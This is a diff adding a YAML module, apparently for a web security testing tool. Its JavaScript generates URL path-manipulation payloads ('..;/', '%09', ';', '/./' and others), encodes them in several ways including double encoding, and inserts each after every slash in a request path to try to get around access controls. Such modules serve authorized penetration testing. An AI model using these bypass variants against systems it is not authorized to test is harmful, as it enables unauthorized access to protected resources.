@@ -1,0 +1,33 @@
+id: misc-middle-path
+description: Add various chars in the middle of the path.
+enabled: true
+modificationScript: |-
+  const rawPayloads = ["%09","%20","#",";",";%09",";%09..",";%09..;","*",".","..","/.","./","/./","x/..;/","/x/..;/","x/y/../../","/x/y/../../","x/y/..;/..;/","/x/y/..;/..;/"];
+
+  function encodeVariants(payload) {
+    const variants = new Set();
+    variants.add(payload);
+    variants.add(encodeURIComponent(payload));
+    variants.add(payload.replace(/\./g, "%2e").replace(/\//g, "%2f").replace(/;/g, "%3b").toLowerCase());
+    variants.add(encodeURIComponent(encodeURIComponent(payload)));
+    return Array.from(variants);
+  }
+
+  const bypassPayloads = new Set();
+  rawPayloads.forEach(p => encodeVariants(p).forEach(v => bypassPayloads.add(v)));
+
+  const currentPath = helper.getPath(input);
+  const modifiedRequests = [];
+
+  [...currentPath].forEach((ch, i) => {
+    if (ch === "/") {
+      bypassPayloads.forEach(payload => {
+        let base = currentPath.slice(0, i + 1);
+        let rest = currentPath.slice(i + 1);
+        modifiedRequests.push(helper.setPath(input, () => base + payload + rest));
+        modifiedRequests.push(helper.setPath(input, () => base + payload + "/" + rest));
+      });
+    }
+  });
+
+  return modifiedRequests;
